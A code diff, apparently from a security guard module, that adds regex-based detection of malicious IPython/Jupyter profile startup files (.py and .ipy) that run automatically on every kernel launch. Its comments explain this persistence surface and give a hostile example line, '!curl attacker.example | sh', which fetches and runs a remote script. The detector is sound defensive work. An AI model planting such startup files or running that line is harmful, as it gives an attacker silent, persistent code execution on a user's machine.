@@ -3369,3 +3369,122 @@ def pysite_pth_dangerous_hit(content: str, *, shell: bool = False, raw: str = No
     if shell and "\n" not in newline_probe:
         return bool(PYSITE_PTH_DANGEROUS_ANY_RE.search(content))
     return bool(PYSITE_PTH_DANGEROUS_LINE_RE.search(content))
+
+
+# ---- IPython/Jupyter interpreter-startup auto-exec protection (profile
+#      startup/*.py / *.ipy) ---------------------------------------------------
+# IPython's own `InteractiveShell` runs every file inside the ACTIVE profile's
+# `startup/` directory, unconditionally, sorted by filename, on EVERY IPython
+# startup -- a plain `ipython` invocation, a Jupyter kernel launch (notebook,
+# lab, qtconsole, `jupyter console`), or anything else that boots an
+# `InteractiveShell` -- no opt-in, no explicit import, no CLI flag, no git/CI/
+# session-restart trigger. This is the IPython-layer analog of `site.py`'s
+# own `sitecustomize.py` mechanism `PYSITE_CUSTOMIZE_PATH_RE` already gates
+# one layer down, at the bare CPython interpreter instead of IPython's own
+# shell -- and it is UNCOVERED by that guard: `sitecustomize.py`/
+# `usercustomize.py` are gated as bare filenames with no directory
+# restriction, so a same-shaped payload sitting under `.ipython/profile_*/
+# startup/` with an unrelated filename never matches either pattern.
+#
+# Two file kinds live in that directory and IPython treats them differently:
+#
+# 1. A `.py` file is executed as plain Python (`exec()`-equivalent, via
+#    `IPython.core.shellapp.InteractiveShellApp.exec_files`) -- the same
+#    "module executes unconditionally, top to bottom, at startup" shape
+#    `CONFTEST_MODULE_LEVEL_RE`/`PYSITE_CUSTOMIZE_PATH_RE` already gate for
+#    conftest.py/sitecustomize.py, just triggered by IPython's own startup
+#    instead of pytest collection or the bare interpreter.
+#
+# 2. A `.ipy` file is run through `safe_execfile_ipy`, which parses it with
+#    IPython's OWN input transformers first -- so IPython "magics" work
+#    inside it, including the bare `!<command>` shell-escape syntax
+#    (`InteractiveShell.system()`) and the `get_ipython().system(...)`/
+#    `.getoutput(...)`/`.run_line_magic(...)`/`.run_cell_magic(...)` API
+#    forms a `.py` file (parsed as plain Python, no magic syntax) must use
+#    instead. A bare `!curl attacker.example | sh` line -- syntactically
+#    invalid plain Python, so it can never appear in a working `.py` file --
+#    is a complete, self-contained shell-exec payload in a `.ipy` file, with
+#    no `os`/`subprocess` import needed at all.
+#
+# Nothing else in this file reaches this surface: `PYSITE_CUSTOMIZE_PATH_RE`
+# gates the bare CPython interpreter's own `site` module, not IPython's
+# profile-startup mechanism; `CONFTEST_PATH_RE` gates pytest's auto-import,
+# not IPython's; neither recognizes the `.ipython/profile_*/startup/`
+# location or the `.ipy` magic-syntax shape at all.
+#
+# `profile_[\w.\-]+` matches any profile name (`profile_default` is the
+# common case, but `ipython --profile=<name>` creates/uses `profile_<name>`
+# for any name a user chooses) -- not hardcoded to `profile_default`, the
+# same "don't over-narrow to the common case" reasoning `PYSITE_DIR_RE`'s own
+# curated-but-not-single-value site-directory list already applies.
+IPYTHON_STARTUP_PATH_RE = re.compile(
+    r"\.ipython" + _SEP + r"profile_[\w.\-]+" + _SEP + r"startup"
+    + _SEP + r"[\w.\-]+\.(?:py|ipy)" + _CI_END,
+    re.IGNORECASE,
+)
+# Public sibling of `_CI_END`-anchored `.ipy` detection, for callers outside
+# this module (`rules.rule_ipython_startup_protect`) that need to tell a
+# `.ipy` match from a `.py` one without reaching into a private helper.
+IPYTHON_IPY_EXT_RE = re.compile(r"\.ipy" + _CI_END, re.IGNORECASE)
+
+# IPython-magic exec primitives a `.ipy` (or, via the plain-Python API form,
+# a `.py`) startup file would use to shell out -- additive to
+# `_CONFTEST_EXEC_CALL`'s own os/subprocess/eval/exec/network vocabulary,
+# which already covers the ordinary-Python forms either file kind can also
+# use directly.
+_IPYTHON_MAGIC_EXEC_CALL = (
+    r"get_ipython\(\)\s*\.\s*(?:system|getoutput|run_line_magic|run_cell_magic)"
+)
+_IPYTHON_EXEC_CALL = r"(?:" + _CONFTEST_EXEC_CALL + r"|" + _IPYTHON_MAGIC_EXEC_CALL + r")"
+
+# Module-level (unindented) call -- the same "executes unconditionally at
+# startup, not merely defined for later, opt-in use" shape
+# `CONFTEST_MODULE_LEVEL_RE` already gates, applied to this vocabulary.
+IPYTHON_MODULE_LEVEL_RE = re.compile(
+    r"^" + _IPYTHON_EXEC_CALL + r"\s*\(",
+    re.IGNORECASE | re.MULTILINE,
+)
+# Position-agnostic sibling for a genuinely single-line shell plant (the
+# whole quoted argument becomes the whole one-line file) -- same
+# single-line-vs-heredoc trade-off `conftest_dangerous_hit`'s own docstring
+# documents in full.
+IPYTHON_DANGEROUS_CALL_RE = re.compile(_IPYTHON_EXEC_CALL + r"\s*\(", re.IGNORECASE)
+
+# `.ipy`-only: a bare `!<command>` shell-escape line, real IPython-magic
+# syntax with no Python call/import needed at all. `[ \t]*` (not `\s*`)
+# keeps this to real leading whitespace on the line, not a blank-line match.
+IPYTHON_BANG_LINE_RE = re.compile(r"^[ \t]*![ \t]*\S", re.MULTILINE)
+# Position-agnostic sibling for a single-line shell plant: the bang sits
+# right after the opening quote of the echoed/printf'd argument, not at
+# column 0 of the scanned shell command -- the same quote-adjacency
+# requirement `PYSITE_PTH_DANGEROUS_ANY_RE`'s own docstring explains and
+# uses for the identical reason (and, like that pattern, a comment-shaped
+# `# see also !curl ...` line inside the quoted content is NOT excluded
+# here the way it is there, since IPython's own `.ipy` transformer treats a
+# LEADING `!` as the shell-escape trigger regardless of what precedes it on
+# the physical line once inside the file -- there is no comment-skip
+# special case to mirror).
+IPYTHON_BANG_ANY_RE = re.compile(r"['\"][ \t]*![ \t]*\S")
+
+
+def ipython_startup_dangerous_hit(content: str, *, is_ipy: bool = False,
+                                   shell: bool = False, raw: str = None) -> bool:
+    """True if `content` carries an IPython profile-startup auto-exec shape:
+    a module-level process/code-exec call (either file kind), or -- for a
+    `.ipy` file only, where IPython's own input transformer makes it real
+    syntax -- a bare `!<command>` shell-escape line.
+
+    ``is_ipy`` selects whether the `.ipy`-only bang-line check applies at
+    all; callers pass it based on `IPYTHON_STARTUP_PATH_RE`'s own matched
+    path extension. ``shell``/``raw`` select the same single-line-vs-heredoc
+    branch `pysite_customize_dangerous_hit`/`conftest_dangerous_hit` already
+    use and document in full."""
+    newline_probe = raw if raw is not None else content
+    single_line = shell and "\n" not in newline_probe
+    module_level = IPYTHON_DANGEROUS_CALL_RE if single_line else IPYTHON_MODULE_LEVEL_RE
+    if module_level.search(content):
+        return True
+    if not is_ipy:
+        return False
+    bang = IPYTHON_BANG_ANY_RE if single_line else IPYTHON_BANG_LINE_RE
+    return bool(bang.search(content))
